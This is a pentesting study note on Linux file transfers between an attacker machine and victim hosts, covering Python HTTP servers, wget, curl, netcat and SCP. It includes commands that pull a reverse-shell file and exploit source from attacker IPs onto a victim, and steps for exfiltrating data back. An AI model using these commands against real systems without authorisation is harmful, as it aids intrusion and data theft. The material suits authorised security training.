# Linux File Transfers

> [!info] Context
> In pentesting/OSCP engagements you constantly move files between your **attacker** (Kali) machine and **victim** (target) machines — payloads, compiled exploits, ELF binaries, enumeration reports, etc. Linux-to-Linux transfers are the simplest case because identical tools are usually available on both ends.

---

## Transfer Direction Overview

| Direction | Typical Use Case |
| --- | --- |
| **Attacker → Victim** | Payloads, reverse shells, compiled exploits |
| **Victim → Attacker** | Enumeration output, loot, data exfiltration |

---

## 1. HTTP — Python Web Server + `wget` / `curl`

The most common approach: host a quick HTTP server on the **source** machine and download from the **destination**.

### Start a Python HTTP Server (source machine)

```bash
python3 -m http.server 80
```

- Serves every file in the **current working directory** as the web root.
- Use port `80` when running as root; use a high port (e.g. `8000`) if unprivileged.

### Download with `wget` (destination machine)

```bash
cd /tmp                                             # writable directory
wget http://192.168.131.128/nc.exe -O nc.exe
wget http://10.8.63.160/sample.txt -O sample.txt
wget http://10.8.63.160/40616.c -O 40616.c
```

- `-O` — specify output filename.
- `wget` also supports recursive downloads, FTP, custom headers, proxies, cookies, User-Agent strings, and authentication flags.

### Download with `curl` (destination machine)

```bash
curl http://<ip>/filename -o filename
curl http://10.8.63.160/reverse_shell -o reverse_shell
```

- `-o` (lowercase) — specify output filename.
- `curl` supports SOCKS proxies, custom HTTP headers, SSL/TLS handling, and User-Agent spoofing — useful when routing through pivot networks.

## 2. Raw TCP — Netcat (`nc`)

Use when **neither `wget` nor `curl`** is installed on the target.

### Check if Netcat exists

```bash
which nc
```

### Transfer flow

**On the receiver** — start a listener and redirect output to a file:

```bash
nc -lvnp 4444 > filename
```

**On the sender** — connect and pipe the file in:

```bash
nc <receiver_ip> 4444 < filename
```

> [!tip]
> Netcat shows no progress bar. Verify transfer by comparing file sizes on both ends.

---

## 3. SCP (SSH-based transfer)

Requires SSH running on the source machine.

### Start SSH on the sender

```bash
sudo service ssh start
```

### Pull file from sender to receiver

```bash
scp <username>@<ip>:/<folder_location>/sample.txt <local_filename>
```

---

## 4. Victim → Attacker (Reverse Transfer)

When you need to **exfiltrate** files from the victim back to your Kali machine:

1. **Check Python on the victim:**

```bash
python3 --version
```

2. **Start a Python HTTP server on the victim** (high port since you're likely unprivileged):

```bash
python3 -m http.server 8000
```

> [!warning]
> You won't be able to bind port `80` if a service is already using it, or if you lack root privileges. Use a high-numbered port instead.

3. **Download from your attacker machine:**

```bash
wget http://<victim_ip>:8000/filename -O filename
# or
curl http://<victim_ip>:8000/filename -o filename
```

---

## Quick Reference

| Method | Command (Receiver Side) | When to Use |
| --- | --- | --- |
| `wget` | `wget http://<ip>/file -O file` | Default — almost always available |
| `curl` | `curl http://<ip>/file -o file` | Alternative to wget; good for proxies |
| Netcat | `nc -lvnp 4444 > file` | No wget/curl on target |
| SCP | `scp user@ip:/path/file local` | SSH access available |
| Python HTTP | `python3 -m http.server 8000` | Hosting files from either end |
